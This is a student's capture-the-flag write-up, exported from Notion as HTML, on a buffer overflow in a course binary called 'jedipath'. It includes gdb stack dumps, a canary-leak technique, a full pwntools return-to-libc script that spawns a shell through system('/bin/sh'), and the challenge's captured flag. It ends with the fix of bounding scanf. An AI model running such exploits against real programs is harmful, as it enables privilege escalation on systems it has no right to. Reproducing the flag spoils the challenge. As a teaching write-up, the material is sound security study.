@@ -1,0 +1,760 @@
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>Ret2libc</title><style>
+/* cspell:disable-file */
+/* webkit printing magic: print all background colors */
+html {
+	-webkit-print-color-adjust: exact;
+}
+* {
+	box-sizing: border-box;
+	-webkit-print-color-adjust: exact;
+}
+
+html,
+body {
+	margin: 0;
+	padding: 0;
+}
+@media only screen {
+	body {
+		margin: 2em auto;
+		max-width: 900px;
+		color: rgb(55, 53, 47);
+	}
+}
+
+body {
+	line-height: 1.5;
+	white-space: pre-wrap;
+}
+
+a,
+a.visited {
+	color: inherit;
+	text-decoration: underline;
+}
+
+.pdf-relative-link-path {
+	font-size: 80%;
+	color: #444;
+}
+
+h1,
+h2,
+h3 {
+	letter-spacing: -0.01em;
+	line-height: 1.2;
+	font-weight: 600;
+	margin-bottom: 0;
+}
+
+.page-title {
+	font-size: 2.5rem;
+	font-weight: 700;
+	margin-top: 0;
+	margin-bottom: 0.75em;
+}
+
+h1 {
+	font-size: 1.875rem;
+	margin-top: 1.875rem;
+}
+
+h2 {
+	font-size: 1.5rem;
+	margin-top: 1.5rem;
+}
+
+h3 {
+	font-size: 1.25rem;
+	margin-top: 1.25rem;
+}
+
+.source {
+	border: 1px solid #ddd;
+	border-radius: 3px;
+	padding: 1.5em;
+	word-break: break-all;
+}
+
+.callout {
+	border-radius: 3px;
+	padding: 1rem;
+}
+
+figure {
+	margin: 1.25em 0;
+	page-break-inside: avoid;
+}
+
+figcaption {
+	opacity: 0.5;
+	font-size: 85%;
+	margin-top: 0.5em;
+}
+
+mark {
+	background-color: transparent;
+}
+
+.indented {
+	padding-left: 1.5em;
+}
+
+hr {
+	background: transparent;
+	display: block;
+	width: 100%;
+	height: 1px;
+	visibility: visible;
+	border: none;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.09);
+}
+
+img {
+	max-width: 100%;
+}
+
+@media only print {
+	img {
+		max-height: 100vh;
+		object-fit: contain;
+	}
+}
+
+@page {
+	margin: 1in;
+}
+
+.collection-content {
+	font-size: 0.875rem;
+}
+
+.column-list {
+	display: flex;
+	justify-content: space-between;
+}
+
+.column {
+	padding: 0 1em;
+}
+
+.column:first-child {
+	padding-left: 0;
+}
+
+.column:last-child {
+	padding-right: 0;
+}
+
+.table_of_contents-item {
+	display: block;
+	font-size: 0.875rem;
+	line-height: 1.3;
+	padding: 0.125rem;
+}
+
+.table_of_contents-indent-1 {
+	margin-left: 1.5rem;
+}
+
+.table_of_contents-indent-2 {
+	margin-left: 3rem;
+}
+
+.table_of_contents-indent-3 {
+	margin-left: 4.5rem;
+}
+
+.table_of_contents-link {
+	text-decoration: none;
+	opacity: 0.7;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.18);
+}
+
+table,
+th,
+td {
+	border: 1px solid rgba(55, 53, 47, 0.09);
+	border-collapse: collapse;
+}
+
+table {
+	border-left: none;
+	border-right: none;
+}
+
+th,
+td {
+	font-weight: normal;
+	padding: 0.25em 0.5em;
+	line-height: 1.5;
+	min-height: 1.5em;
+	text-align: left;
+}
+
+th {
+	color: rgba(55, 53, 47, 0.6);
+}
+
+ol,
+ul {
+	margin: 0;
+	margin-block-start: 0.6em;
+	margin-block-end: 0.6em;
+}
+
+li > ol:first-child,
+li > ul:first-child {
+	margin-block-start: 0.6em;
+}
+
+ul > li {
+	list-style: disc;
+}
+
+ul.to-do-list {
+	text-indent: -1.7em;
+}
+
+ul.to-do-list > li {
+	list-style: none;
+}
+
+.to-do-children-checked {
+	text-decoration: line-through;
+	opacity: 0.375;
+}
+
+ul.toggle > li {
+	list-style: none;
+}
+
+ul {
+	padding-inline-start: 1.7em;
+}
+
+ul > li {
+	padding-left: 0.1em;
+}
+
+ol {
+	padding-inline-start: 1.6em;
+}
+
+ol > li {
+	padding-left: 0.2em;
+}
+
+.mono ol {
+	padding-inline-start: 2em;
+}
+
+.mono ol > li {
+	text-indent: -0.4em;
+}
+
+.toggle {
+	padding-inline-start: 0em;
+	list-style-type: none;
+}
+
+/* Indent toggle children */
+.toggle > li > details {
+	padding-left: 1.7em;
+}
+
+.toggle > li > details > summary {
+	margin-left: -1.1em;
+}
+
+.selected-value {
+	display: inline-block;
+	padding: 0 0.5em;
+	background: rgba(206, 205, 202, 0.5);
+	border-radius: 3px;
+	margin-right: 0.5em;
+	margin-top: 0.3em;
+	margin-bottom: 0.3em;
+	white-space: nowrap;
+}
+
+.collection-title {
+	display: inline-block;
+	margin-right: 1em;
+}
+
+.simple-table {
+	margin-top: 1em;
+	font-size: 0.875rem;
+	empty-cells: show;
+}
+.simple-table td {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table th {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table-header-color {
+	background: rgb(247, 246, 243);
+	color: black;
+}
+.simple-table-header {
+	font-weight: 500;
+}
+
+time {
+	opacity: 0.5;
+}
+
+.icon {
+	display: inline-block;
+	max-width: 1.2em;
+	max-height: 1.2em;
+	text-decoration: none;
+	vertical-align: text-bottom;
+	margin-right: 0.5em;
+}
+
+img.icon {
+	border-radius: 3px;
+}
+
+.user-icon {
+	width: 1.5em;
+	height: 1.5em;
+	border-radius: 100%;
+	margin-right: 0.5rem;
+}
+
+.user-icon-inner {
+	font-size: 0.8em;
+}
+
+.text-icon {
+	border: 1px solid #000;
+	text-align: center;
+}
+
+.page-cover-image {
+	display: block;
+	object-fit: cover;
+	width: 100%;
+	max-height: 30vh;
+}
+
+.page-header-icon {
+	font-size: 3rem;
+	margin-bottom: 1rem;
+}
+
+.page-header-icon-with-cover {
+	margin-top: -0.72em;
+	margin-left: 0.07em;
+}
+
+.page-header-icon img {
+	border-radius: 3px;
+}
+
+.link-to-page {
+	margin: 1em 0;
+	padding: 0;
+	border: none;
+	font-weight: 500;
+}
+
+p > .user {
+	opacity: 0.5;
+}
+
+td > .user,
+td > time {
+	white-space: nowrap;
+}
+
+input[type="checkbox"] {
+	transform: scale(1.5);
+	margin-right: 0.6em;
+	vertical-align: middle;
+}
+
+p {
+	margin-top: 0.5em;
+	margin-bottom: 0.5em;
+}
+
+.image {
+	border: none;
+	margin: 1.5em 0;
+	padding: 0;
+	border-radius: 0;
+	text-align: center;
+}
+
+.code,
+code {
+	background: rgba(135, 131, 120, 0.15);
+	border-radius: 3px;
+	padding: 0.2em 0.4em;
+	border-radius: 3px;
+	font-size: 85%;
+	tab-size: 2;
+}
+
+code {
+	color: #eb5757;
+}
+
+.code {
+	padding: 1.5em 1em;
+}
+
+.code-wrap {
+	white-space: pre-wrap;
+	word-break: break-all;
+}
+
+.code > code {
+	background: none;
+	padding: 0;
+	font-size: 100%;
+	color: inherit;
+}
+
+blockquote {
+	font-size: 1.25em;
+	margin: 1em 0;
+	padding-left: 1em;
+	border-left: 3px solid rgb(55, 53, 47);
+}
+
+.bookmark {
+	text-decoration: none;
+	max-height: 8em;
+	padding: 0;
+	display: flex;
+	width: 100%;
+	align-items: stretch;
+}
+
+.bookmark-title {
+	font-size: 0.85em;
+	overflow: hidden;
+	text-overflow: ellipsis;
+	height: 1.75em;
+	white-space: nowrap;
+}
+
+.bookmark-text {
+	display: flex;
+	flex-direction: column;
+}
+
+.bookmark-info {
+	flex: 4 1 180px;
+	padding: 12px 14px 14px;
+	display: flex;
+	flex-direction: column;
+	justify-content: space-between;
+}
+
+.bookmark-image {
+	width: 33%;
+	flex: 1 1 180px;
+	display: block;
+	position: relative;
+	object-fit: cover;
+	border-radius: 1px;
+}
+
+.bookmark-description {
+	color: rgba(55, 53, 47, 0.6);
+	font-size: 0.75em;
+	overflow: hidden;
+	max-height: 4.5em;
+	word-break: break-word;
+}
+
+.bookmark-href {
+	font-size: 0.75em;
+	margin-top: 0.25em;
+}
+
+.sans { font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"; }
+.code { font-family: "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace; }
+.serif { font-family: Lyon-Text, Georgia, ui-serif, serif; }
+.mono { font-family: iawriter-mono, Nitti, Menlo, Courier, monospace; }
+.pdf .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK JP'; }
+.pdf:lang(zh-CN) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC'; }
+.pdf:lang(zh-TW) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK TC'; }
+.pdf:lang(ko-KR) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK KR'; }
+.pdf .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK JP'; }
+.pdf:lang(zh-CN) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK SC'; }
+.pdf:lang(zh-TW) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK TC'; }
+.pdf:lang(ko-KR) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK KR'; }
+.pdf .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.highlight-default {
+	color: rgba(55, 53, 47, 1);
+}
+.highlight-gray {
+	color: rgba(120, 119, 116, 1);
+	fill: rgba(120, 119, 116, 1);
+}
+.highlight-brown {
+	color: rgba(159, 107, 83, 1);
+	fill: rgba(159, 107, 83, 1);
+}
+.highlight-orange {
+	color: rgba(217, 115, 13, 1);
+	fill: rgba(217, 115, 13, 1);
+}
+.highlight-yellow {
+	color: rgba(203, 145, 47, 1);
+	fill: rgba(203, 145, 47, 1);
+}
+.highlight-teal {
+	color: rgba(68, 131, 97, 1);
+	fill: rgba(68, 131, 97, 1);
+}
+.highlight-blue {
+	color: rgba(51, 126, 169, 1);
+	fill: rgba(51, 126, 169, 1);
+}
+.highlight-purple {
+	color: rgba(144, 101, 176, 1);
+	fill: rgba(144, 101, 176, 1);
+}
+.highlight-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.highlight-red {
+	color: rgba(212, 76, 71, 1);
+	fill: rgba(212, 76, 71, 1);
+}
+.highlight-gray_background {
+	background: rgba(241, 241, 239, 1);
+}
+.highlight-brown_background {
+	background: rgba(244, 238, 238, 1);
+}
+.highlight-orange_background {
+	background: rgba(251, 236, 221, 1);
+}
+.highlight-yellow_background {
+	background: rgba(251, 243, 219, 1);
+}
+.highlight-teal_background {
+	background: rgba(237, 243, 236, 1);
+}
+.highlight-blue_background {
+	background: rgba(231, 243, 248, 1);
+}
+.highlight-purple_background {
+	background: rgba(244, 240, 247, 0.8);
+}
+.highlight-pink_background {
+	background: rgba(249, 238, 243, 0.8);
+}
+.highlight-red_background {
+	background: rgba(253, 235, 236, 1);
+}
+.block-color-default {
+	color: inherit;
+	fill: inherit;
+}
+.block-color-gray {
+	color: rgba(120, 119, 116, 1);
+	fill: rgba(120, 119, 116, 1);
+}
+.block-color-brown {
+	color: rgba(159, 107, 83, 1);
+	fill: rgba(159, 107, 83, 1);
+}
+.block-color-orange {
+	color: rgba(217, 115, 13, 1);
+	fill: rgba(217, 115, 13, 1);
+}
+.block-color-yellow {
+	color: rgba(203, 145, 47, 1);
+	fill: rgba(203, 145, 47, 1);
+}
+.block-color-teal {
+	color: rgba(68, 131, 97, 1);
+	fill: rgba(68, 131, 97, 1);
+}
+.block-color-blue {
+	color: rgba(51, 126, 169, 1);
+	fill: rgba(51, 126, 169, 1);
+}
+.block-color-purple {
+	color: rgba(144, 101, 176, 1);
+	fill: rgba(144, 101, 176, 1);
+}
+.block-color-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.block-color-red {
+	color: rgba(212, 76, 71, 1);
+	fill: rgba(212, 76, 71, 1);
+}
+.block-color-gray_background {
+	background: rgba(241, 241, 239, 1);
+}
+.block-color-brown_background {
+	background: rgba(244, 238, 238, 1);
+}
+.block-color-orange_background {
+	background: rgba(251, 236, 221, 1);
+}
+.block-color-yellow_background {
+	background: rgba(251, 243, 219, 1);
+}
+.block-color-teal_background {
+	background: rgba(237, 243, 236, 1);
+}
+.block-color-blue_background {
+	background: rgba(231, 243, 248, 1);
+}
+.block-color-purple_background {
+	background: rgba(244, 240, 247, 0.8);
+}
+.block-color-pink_background {
+	background: rgba(249, 238, 243, 0.8);
+}
+.block-color-red_background {
+	background: rgba(253, 235, 236, 1);
+}
+.select-value-color-pink { background-color: rgba(245, 224, 233, 1); }
+.select-value-color-purple { background-color: rgba(232, 222, 238, 1); }
+.select-value-color-green { background-color: rgba(219, 237, 219, 1); }
+.select-value-color-gray { background-color: rgba(227, 226, 224, 1); }
+.select-value-color-opaquegray { background-color: rgba(255, 255, 255, 0.0375); }
+.select-value-color-orange { background-color: rgba(250, 222, 201, 1); }
+.select-value-color-brown { background-color: rgba(238, 224, 218, 1); }
+.select-value-color-red { background-color: rgba(255, 226, 221, 1); }
+.select-value-color-yellow { background-color: rgba(253, 236, 200, 1); }
+.select-value-color-blue { background-color: rgba(211, 229, 239, 1); }
+
+.checkbox {
+	display: inline-flex;
+	vertical-align: text-bottom;
+	width: 16;
+	height: 16;
+	background-size: 16px;
+	margin-left: 2px;
+	margin-right: 5px;
+}
+
+.checkbox-on {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+
+.checkbox-off {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+	
+</style></head><body><article id="853de415-e336-4897-b225-386a024a9a70" class="page sans"><header><h1 class="page-title">Ret2libc</h1></header><div class="page-body"><h1 id="3256781e-0f9d-4471-a4db-16441edbce5c" class="">Jedipath Markdown - 11912007</h1><p id="c2acdb70-d872-4b66-9f0a-0e205a35893b" class="">Note: I am only participating in the UE segment of this course. I did this challenge just for fun.</p><h2 id="3e210c10-dd6c-4562-84cd-1fe0c911bd2a" class="">Team</h2><p id="fdc79cc2-378d-493c-bccd-d3f97fe69130" class="">For this challenge I worked with: Johannes Zottele - 11911133</p><p id="f8bd6b95-a57a-43a6-8253-26888e6266c0" class="">
+</p><h2 id="bd58285b-e837-44d3-b1e3-45f3396b73f6" class="">Overview</h2><p id="99e9f543-e8aa-4183-8ae8-f91d1301a163" class="">The executable <code>jedipath</code>  in the <code>/challenges/jedipath/jedipath</code> directory asks you to guess the Jedis thoughts (with 3 attempts) and if guessed correctly, returns the SHA256 encrypted <code>flag</code> file located in <code>/challenges/jedipath/flag</code>. </p><p id="5c60b537-eb38-4456-b85b-3b62774ab83b" class="">We have the right to read to part of the source code and the binary located in the file.</p><p id="2a3ef849-8b88-4f73-af58-41426642a6b8" class="">We want the <code>flag</code> file but the executables output is useless and only the <code>jedipath</code> executable has reading premission for that file.</p><p id="9974fb70-1f3f-4601-b40d-d3fad0d2f4e2" class="">
+</p><h2 id="05b57478-2564-45fb-b124-5dc5d5ebd396" class="">Vulnerability</h2><p id="0b8c9feb-e476-4daf-ad43-fdc8293e9816" class="">After inspecting the (incomplete) source code (written in C) we figure out that our input <code>guess</code> allocates 64 bytes but the scanner has no boundary for the input size and therfore lets us put in something arbitrary and just adds a &#x27;\n&#x27; character at the end of it.</p><p id="c1a64634-6469-4348-ad1f-f5b6c02556d0" class="">We ask ourselves what would happen if we would try to smash the stack by entering in a huge input with &gt;64 chars.</p><p id="3aaf2e83-75d9-44a6-a6bd-62b210b3ac80" class="">The system detected our attempt to smash the stack and returned an error saying so. Therefore we figured out that there must be a memory defense system and analyzed the stack in the gdb debugger:</p><pre id="9ad6b2cb-1bdf-40c5-a14e-365b2837e862" class="code"><code>(gdb) r &lt; &lt;(python3 -c &#x27;print(&quot;A&quot;*64)&#x27;)</code></pre><pre id="05801808-c2f7-4a8d-9938-0cdfec2dc540" class="code"><code>x/40wx $esp
+
+0xffffd510:     0xf7fc1d80      0x00000001      0x1339f476      0xffffd53c
+0xffffd520:     0x00000001      0xf7dedbd8      0xf7fcf410      0x00000000
+0xffffd530:     0x00000001      0x00000040      0x1339f476      0x41414141
+0xffffd540:     0x41414141      0x41414141      0x41414141      0x41414141
+0xffffd550:     0x41414141      0x41414141      0x41414141      0x41414141
+0xffffd560:     0x41414141      0x41414141      0x41414141      0x41414141
+0xffffd570:     0x41414141      0x41414141      0x41414141      0x[CANARY]0a &lt;- x\0a = &#x27;\n&#x27;
+0xffffd580:     0x00000476      0x0804a000      0xffffd5a8      0x080489bf
+0xffffd590:     0x00000001      0xffffd654      0xffffd65c      0x00000476
+0xffffd5a0:     0xffffd5c0      0x00000000      0x00000000      0xf7e01f21</code></pre><p id="654af455-be01-4681-823b-85e144b7bff8" class="">It turns out that the stack structure is not as expected because the stack stores our <code>guess</code> <em>beneath</em> the local variables. Overwriting local variables with stack overflow is therefore not possible.</p><p id="892ce7ab-ab10-41dd-a633-831f6d3b8881" class="">We sketched out what we assume the stack must look like:</p><pre id="333a7584-ba49-4e97-8732-271bdfdec4b1" class="code"><code>STACK:
+
+| ...           | &lt;- ESP
+|guess_len      |
+|attempt        |
+|correct_guesses|
+|guessed_number |
+|secret_number  |
+|guess          | &lt;- buffer, 64 byte
+|canary         | &lt;- 4 bytes
+| ...           | &lt;- 12 bytes (padding)
+|return address | &lt;- EIP, 4 bytes
+| ...           | &lt;- EBP</code></pre><p id="e2d3e61b-157e-49d7-88a1-4e967ae90f33" class="">Because the program reads our input without any limitation and because the canary does not change with each of our attempts, it is possible to put the nil char <code>0x00</code> at some other point in our input and read as much of the stack as we want.</p><p id="24e9cd7c-a6c7-4324-aa02-a9fd1dd77d9f" class="">After getting the canary&#x27;s value we can overwrite it without the system noticing and reach the return address. </p><p id="f6549c37-01ac-43fb-b93e-dbc752133736" class="">This makes this program vulnerable to Return-to-libc attacks.</p><p id="5426ac10-7648-4c95-9129-94695246ec68" class="">
+</p><h2 id="8ebf3dfa-b825-4755-ad60-0ada2c949a17" class="">Exploitation</h2><p id="caf3c582-625f-46d8-9ffb-fc4019313fce" class="">First we used the gdb debugger to figure out which parts of our programs stack remain unchanged after multiple executions to figure out the paddings size.</p><p id="f70bce13-665b-4ee9-8036-ea0d8f8f509a" class="">After the 3 generated bytes of the canary, followed a 12 byte sized padding there is the return address <code><mark class="highlight-orange">0x080489bf</mark></code><mark class="highlight-orange"> </mark>(see the stack above).</p><p id="b1fc3996-02c7-43a6-84b5-5afb913cf2cb" class="">
+</p><p id="988f979b-5e6b-48e2-9d0f-da0f991cac51" class="">Our goal was to use 2 out of 3 possible attempts to gain access to the shell with the rights of the <code>jedipath</code> executable by changing the return address:</p><ol type="1" id="82b777cf-4141-4bda-8134-f5d28d74de65" class="numbered-list" start="1"><li>Attempt → payload with 64 chars to <span style="border-bottom:0.05em solid">read canary</span></li></ol><ol type="1" id="bccb3b89-d89c-4598-ae77-96b531af6134" class="numbered-list" start="2"><li>Attempt → concatenate buffer with canary + padding to overwrite the <code>return address</code> to <code>&amp;system</code> and previous parameters to the pointer that points to <code>&quot; /bin/sh&quot;</code> so that we call <code>system(&quot; /bin/sh&quot;)</code> (to have a nested process within this process) </li></ol><p id="0ac3b640-5dec-428d-bb57-3cfb74a26b36" class="">
+</p><p id="15b287ed-4c46-410d-b7e5-fec81e3166d7" class="">We looked up the systems address in the program (<code>0xf7e262e0</code>) and then continued our journey by taking a look at the library functions called in the program: </p><pre id="e75b791c-6ffe-4cd6-b6aa-eaba8a79e6c2" class="code"><code>(gdb) info proc map</code></pre><p id="a8819a42-2b19-4957-8d6e-ed7d14c68179" class="">and used the <code>find</code> command to search for <code>&quot; /bin/sh&quot;</code>.</p><p id="01433993-8da4-4e8f-a6f8-fbb7c580a4fe" class="">
+</p><p id="fdc3c2d3-8b46-4f48-9e4d-d1621a8a0da6" class="">At this point we had all the necessary data to create our own python script with pwntools and therefore generated a <code>pwn template</code> to start working.</p><pre id="f53f41b7-30bf-47bb-9465-0ca3b8e1baa6" class="code"><code>#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+# This exploit template was generated via:
+# $ pwn template ./jedipath
+from pwn import *
+
+class bcolors:
+    WARNING = &#x27;\033[93m&#x27;
+    ENDC = &#x27;\033[0m&#x27;
+
+# Set up pwntools for the correct architecture
+exe = context.binary = ELF(&#x27;/challenges/jedipath/jedipath&#x27;)
+
+def start(argv=[], *a, **kw):
+    &#x27;&#x27;&#x27;Start the exploit against the target.&#x27;&#x27;&#x27;
+    if args.GDB:
+        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
+    else:
+        return process([exe.path] + argv, *a, **kw)
+
+# Specify your GDB script here for debugging
+# GDB will be launched if the exploit is run via e.g.
+# ./exploit.py GDB
+gdbscript = &#x27;&#x27;&#x27;
+break main
+break system
+break *0x080488fc
+continue
+&#x27;&#x27;&#x27;.format(**locals())
+
+#===========================================================
+#                    EXPLOIT GOES HERE
+#===========================================================
+# Arch:     i386-32-little
+# RELRO:    Partial RELRO
+# Stack:    Canary found
+# NX:       NX enabled
+# PIE:      No PIE (0x8048000)
+
+io = start() #this is our process
+
+#ATTEMPT 1
+input = &#x27;A&#x27;*64 #to get the canary as the output
+print(io.recvuntil(b&quot;[1]&quot;))
+io.sendline(input)
+print(io.readline())
+canary = io.recvuntil(b&#x27;[2]&#x27;)[:3] #get first 3 bytes as chars
+print(bcolors.WARNING + &quot;FOUND CANARY: &quot; + canary + bcolors.ENDC)
+
+#ATTEMPT 2
+p1 = p32(0x00000476)
+p2 = p32(0x0804a000)
+p3 = p32(0xffffd598)
+padding = p1 + p2 + p3 #12 bytes     
+systemAddress = p32(0xf7e262e0)
+fakeRet = p32(0xdeadbeef) #does not matter
+binsh = p32(0xf7f670af)
+payload = input + b&quot;\x00&quot; + canary + padding + systemAddress + fakeRet + binsh 
+io.sendline(payload)
+
+io.interactive()</code></pre><p id="011d6b9c-969d-40a7-8e78-e29c70fccb85" class="">We then got access to the shell with the privileges of the <code>jedipat</code> executable and just used the linux shell cat command to read the flag:</p><pre id="b0248312-6e3b-42bc-93c5-fd48fcc608c5" class="code"><code>WUT{Much_t0_l34rn_y0u_st1ll_h4v3!}</code></pre><p id="5e894fd5-2b92-4143-a71b-50a1e4f8e330" class="">
+</p><h2 id="9538a902-f9a7-4a28-b9ee-ad9a90c6572a" class="">Solution</h2><p id="b21d61f5-ce5c-4b54-ab5d-3dc980409f98" class="">We could not have successfully executed the buffer overflow exploit that the Return-to-libc attack is based on, if the source code had a limit for <code>scanf</code> in the first place. </p><p id="5de133fa-eb6a-4d9f-b3e3-b68f6bcb15f8" class="">
+</p></div></article></body></html>
